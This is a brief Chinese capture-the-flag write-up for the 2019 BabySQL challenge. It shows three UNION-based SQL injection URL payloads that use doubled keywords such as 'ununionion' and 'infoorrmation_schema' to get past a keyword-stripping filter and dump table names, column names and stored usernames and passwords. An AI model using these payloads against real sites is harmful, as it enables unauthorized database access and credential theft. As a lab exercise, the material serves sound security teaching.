# [极客大挑战 2019]BabySQL

## 知识点

`sql注入`

`双写绕过`

## 解题

注意`information_schema`中包含`or`，所以双写绕过为`infoorrmation_schema`

```sql
check.php?username=1%27ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23&password=123

?username=1%27ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name="b4bsql"%23&password=123

?username=1%27ununionion selselectect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23&password=123
```
